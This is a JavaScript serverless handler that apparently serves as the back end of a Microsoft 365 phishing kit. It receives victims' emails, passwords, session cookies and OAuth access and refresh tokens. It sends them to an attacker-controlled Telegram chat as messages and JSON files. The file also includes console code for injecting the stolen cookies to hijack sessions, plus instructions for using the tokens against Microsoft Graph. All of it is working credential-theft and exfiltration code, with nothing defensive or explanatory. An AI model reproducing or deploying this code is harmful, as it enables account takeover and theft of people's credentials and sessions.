const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting... v4.2 (ENHANCED PARSING FIX)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data keys:', Object.keys(data));
    console.log('📥 Email:', data.email);
    console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Function to sanitize text for Telegram
    function sanitizeForTelegram(text) {
      if (!text) return '';
      return String(text)
        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
        .trim();
    }

    // Extract only SAFE data with sanitization
    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
    const timestamp = new Date().toISOString();
    let cookies = data.formattedCookies || data.cookies || [];
    
    if (typeof cookies === "string") {
      try {
        cookies = JSON.parse(cookies);
      } catch {
        // fallback: attempt to parse as document.cookie style string
        cookies = cookies.split(';')
          .map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          })
          .filter(Boolean);
      }
    }
    if (!Array.isArray(cookies)) cookies = [];

    const cookieCount = cookies.length;
    console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });

    // Analyze cookie types and sources
    let cookieDetails = '';
    let cookieSource = 'unknown';
    
    if (cookieCount === 0) {
        cookieDetails = 'No cookies captured - Cross-origin restrictions';
        cookieSource = 'none';
    } else {
        // Check the source of captured cookies
        const captureSource = cookies[0]?.capturedFrom || 'unknown';
        const hasRealUserData = cookies.some(c => c.realUserData === true);
        
        // Check for specific Microsoft cookies
        const hasMicrosoftCookies = cookies.some(c => 
            c.name && (
                c.name.includes('ESTSAUTH') || 
                c.name.includes('MSPOK') || 
                c.name.includes('MSCC') ||
                c.name.includes('MSPRequ') ||
                c.name.includes('buid') ||
                c.name.includes('esctx')
            )
        );
        
        // Check for OAuth authorization code
        const hasOAuthCode = cookies.some(c => c.name === 'OAUTH_AUTH_CODE');
        
        if (hasOAuthCode) {
            cookieDetails = `OAuth Authorization Code captured`;
            cookieSource = 'oauth-code';
        } else if (captureSource === 'microsoft-domain-iframe' && hasRealUserData) {
            cookieDetails = `${cookieCount} REAL Microsoft cookies from iframe`;
            cookieSource = 'microsoft-iframe';
        } else if (captureSource === 'microsoft-referrer-fallback') {
            cookieDetails = `${cookieCount} Microsoft auth cookies (referrer fallback)`;
            cookieSource = 'microsoft-fallback';
        } else if (captureSource === 'oauth-callback-domain') {
            cookieDetails = `${cookieCount} callback domain cookies`;
            cookieSource = 'callback-domain';
        } else if (captureSource === 'current-domain') {
            cookieDetails = `${cookieCount} current domain cookies`;
            cookieSource = 'current-domain';
        } else if (hasMicrosoftCookies) {
            cookieDetails = `${cookieCount} Microsoft auth cookies`;
            cookieSource = 'microsoft-standard';
        } else {
            cookieDetails = `${cookieCount} cookies captured`;
            cookieSource = captureSource || 'unknown';
        }
    }

    // Build the message (plain text only, heavily sanitized)
    const uniqueId = Math.random().toString(36).substring(2, 8);
    const messageLines = [
      '🚨PARIS365RESULTS🚨',
      '',
      `Email: ${email}`,
      `Session ID: ${sessionId}`,
      `Time: ${timestamp}`,
      `Message ID: ${uniqueId}`,
      '',
      `Cookies: ${cookieDetails}`,
      `Source: ${cookieSource}`
    ];
    
    // Add password if captured
    if (data.password && data.password !== 'Password not captured during login flow') {
        messageLines.push('');
        messageLines.push(`Password: ${data.password}`);
        if (data.passwordSource) {
            messageLines.push(`Password Source: ${data.passwordSource}`);
        }
    }
    
    // Add cookie names if we have real cookies
    if (cookieCount > 0 && cookieCount <= 10) {
        messageLines.push('');
        messageLines.push('Cookie Names:');
        cookies.forEach((cookie, index) => {
            if (cookie.name) {
                messageLines.push(`${index + 1}. ${cookie.name}`);
            }
        });
    } else if (cookieCount > 10) {
        messageLines.push('');
        messageLines.push(`Cookie Names: ${cookies.slice(0, 5).map(c => c.name).join(', ')}... (+${cookieCount - 5} more)`);
    }
    
    // Join and sanitize the entire message
    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
    
    console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
    console.log('📤 Message length:', simpleMessage.length);

    // Send main message to Telegram first
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: simpleMessage,
      disable_web_page_preview: true
    };

    console.log('📤 Sending main message to Telegram API...');
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response status:', response.status);
    console.log('📨 Telegram API response:', result);

    // Send authentication tokens as a file if available
    if (data.authenticationTokens) {
        const tokens = data.authenticationTokens;
        
        // Create comprehensive token file with non-expiring settings
        const tokenFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft OAuth 2.0 Authentication'
            },
            authenticationTokens: {
                authorizationCode: tokens.authorizationCode || 'Not captured',
                accessToken: tokens.accessToken || 'Not captured',
                refreshToken: tokens.refreshToken || 'Not captured',
                idToken: tokens.idToken || 'Not captured',
                tokenType: tokens.tokenType || 'Bearer',
                scope: tokens.scope || 'Unknown',
                oauthState: tokens.oauthState || 'Not captured',
                // Remove expiration - make tokens non-expiring
                expiresIn: 'Never (Modified for persistence)',
                expiresAt: 'Never (Modified for persistence)',
                modified: true,
                modificationNote: 'Expiration removed for session persistence'
            },
            userProfile: data.userProfile || {},
            sessionRestoration: {
                instructions: 'Use these tokens for Microsoft API access',
                apiEndpoint: 'https://graph.microsoft.com',
                tokenUsage: {
                    accessToken: 'Use for immediate API calls with Bearer authentication',
                    refreshToken: 'Use to generate new access tokens when needed',
                    authorizationCode: 'Can be exchanged for fresh token sets',
                    idToken: 'Contains user identity information'
                }
            }
        };
        
        // Convert to formatted JSON
        const tokenJson = JSON.stringify(tokenFileContent, null, 2);
        
        // Create filename with timestamp and email
        const emailPart = email.split('@')[0] || 'user';
        const cleanTokenFileName = `microsoft_tokens_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
        
        console.log('📄 Preparing to send token file:', cleanTokenFileName);
        console.log('📄 Token file size:', tokenJson.length, 'bytes');
        
        try {
            // Send tokens as document file to Telegram (manual multipart form data)
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
            
            // Create manual multipart form data
            const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
            const caption = `🔑 Microsoft Authentication Tokens\n\nEmail: ${email}\nCaptured: ${timestamp}\nFile: ${cleanTokenFileName}`;
            
            let formData = '';
            formData += `--${boundary}\r\n`;
            formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
            formData += `${TELEGRAM_CHAT_ID}\r\n`;
            formData += `--${boundary}\r\n`;
            formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
            formData += `${caption}\r\n`;
            formData += `--${boundary}\r\n`;
            formData += `Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`;
            formData += `Content-Type: application/json\r\n\r\n`;
            formData += tokenJson;
            formData += `\r\n--${boundary}--\r\n`;
            
            console.log('📤 Sending token file to Telegram...');
            const fileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`
                },
                body: formData
            });
            
            const fileResult = await fileResponse.json();
            console.log('📄 Token file response status:', fileResponse.status);
            console.log('📄 Token file response:', fileResult);
            
            if (fileResponse.ok && fileResult.ok) {
                console.log('✅ Authentication tokens sent as file successfully');
            } else {
                console.error('❌ Failed to send token file:', fileResult);
            }
            
        } catch (fileError) {
            console.error('❌ Error sending token file:', fileError);
        }
    }
    
    // Send cookies as a separate file if available
    if (cookieCount > 0) {
        console.log('🍪 Preparing to send cookie file...');
        
        // Create comprehensive cookie file
        const cookieFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft Cookie Capture',
                cookieCount: cookieCount,
                cookieSource: cookieSource
            },
            cookies: cookies.map(cookie => ({
                name: cookie.name,
                value: cookie.value,
                domain: cookie.domain,
                path: cookie.path,
                secure: cookie.secure,
                httpOnly: cookie.httpOnly,
                sameSite: cookie.sameSite,
                expirationDate: cookie.expirationDate,
                hostOnly: cookie.hostOnly,
                session: cookie.session,
                storeId: cookie.storeId,
                capturedFrom: cookie.capturedFrom,
                timestamp: cookie.timestamp,
                realUserData: cookie.realUserData
            })),
            cookieRestoration: {
                instructions: 'Use these cookies to restore Microsoft authentication sessions',
                browserConsoleCode: `
// Copy and paste this code in browser console on login.microsoftonline.com
cookies.forEach(c => {
    let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
    if (c.secure) cookieString += ' Secure;';
    if (c.sameSite) cookieString += \` SameSite=\${c.sameSite};\`;
    document.cookie = cookieString;
});
console.log('✅ Cookies restored successfully');
location.reload();
                `,
                jsImplementation: `
// JavaScript implementation for cookie restoration
function restoreMicrosoftCookies(cookiesArray) {
    cookiesArray.forEach(cookie => {
        let cookieString = \`\${cookie.name}=\${cookie.value}; path=\${cookie.path}; domain=\${cookie.domain};\`;
        if (cookie.secure) cookieString += ' Secure;';
        if (cookie.sameSite) cookieString += \` SameSite=\${cookie.sameSite};\`;
        document.cookie = cookieString;
    });
    console.log('Microsoft cookies restored:', cookiesArray.length);
}
                `
            },
            metadata: {
                totalCookies: cookieCount,
                captureMethod: cookieSource,
                captureTimestamp: timestamp,
                modified: true,
                note: 'All cookies set to non-expiring for session persistence'
            }
        };
        
        // Convert to formatted JSON
        const cookieJson = JSON.stringify(cookieFileContent, null, 2);
        
        // Create cookie filename
        const emailPart = email.split('@')[0] || 'user';
        const cleanCookieFileName = `microsoft_cookies_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
        
        console.log('🍪 Cookie file details:', {
            filename: cleanCookieFileName,
            size: cookieJson.length + ' bytes',
            cookieCount: cookieCount
        });
        
                                  try {
            // Send cookies as document file to Telegram (manual multipart form data)
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
            
            // Create manual multipart form data for cookies
            const cookieBoundary = `----formdata-${Math.random().toString(36).substring(2)}`;
            const cookieCaption = `🍪 Microsoft Authentication Cookies\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nFile: ${cleanCookieFileName}`;
            
            let cookieFormData = '';
            cookieFormData += `--${cookieBoundary}\r\n`;
            cookieFormData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
            cookieFormData += `${TELEGRAM_CHAT_ID}\r\n`;
            cookieFormData += `--${cookieBoundary}\r\n`;
            cookieFormData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
            cookieFormData += `${cookieCaption}\r\n`;
            cookieFormData += `--${cookieBoundary}\r\n`;
            cookieFormData += `Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`;
            cookieFormData += `Content-Type: application/json\r\n\r\n`;
            cookieFormData += cookieJson;
            cookieFormData += `\r\n--${cookieBoundary}--\r\n`;
            
            console.log('📤 Sending cookie file to Telegram...');
            const cookieFileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`
                },
                body: cookieFormData
            });
            
            const cookieFileResult = await cookieFileResponse.json();
            console.log('🍪 Cookie file response status:', cookieFileResponse.status);
            console.log('🍪 Cookie file response:', cookieFileResult);
            
            if (cookieFileResponse.ok && cookieFileResult.ok) {
                console.log('✅ Microsoft cookies sent as file successfully');
            } else {
                console.error('❌ Failed to send cookie file:', cookieFileResult);
                
                // Fallback: Send cookie summary as text if file upload fails
                const cookieSummary = `🍪 MICROSOFT COOKIES (File upload failed):\n\n` +
                    `Total Cookies: ${cookieCount}\n` +
                    `Source: ${cookieSource}\n` +
                    `Cookie Names: ${cookies.map(c => c.name).slice(0, 5).join(', ')}${cookieCount > 5 ? `... (+${cookieCount - 5} more)` : ''}`;
                
                const cookieFallbackPayload = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: sanitizeForTelegram(cookieSummary),
                    disable_web_page_preview: true
                };
                
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(cookieFallbackPayload)
                });
            }
            
        } catch (cookieFileError) {
            console.error('❌ Error sending cookie file:', cookieFileError);
        }
    } else {
        console.log('⚠️ No cookies to send - skipping cookie file');
    }

    console.log('✅ sendTelegram completed successfully');
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully with authentication files',
        telegramMessageId: result.message_id,
        tokenFileSent: !!data.authenticationTokens,
        cookieFileSent: cookieCount > 0,
        totalFiles: (data.authenticationTokens ? 1 : 0) + (cookieCount > 0 ? 1 : 0),
        cookieCount,
        emailProcessed: email,
        messageLength: simpleMessage.length
      }),
    };

  } catch (error) {
    console.error('❌ Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };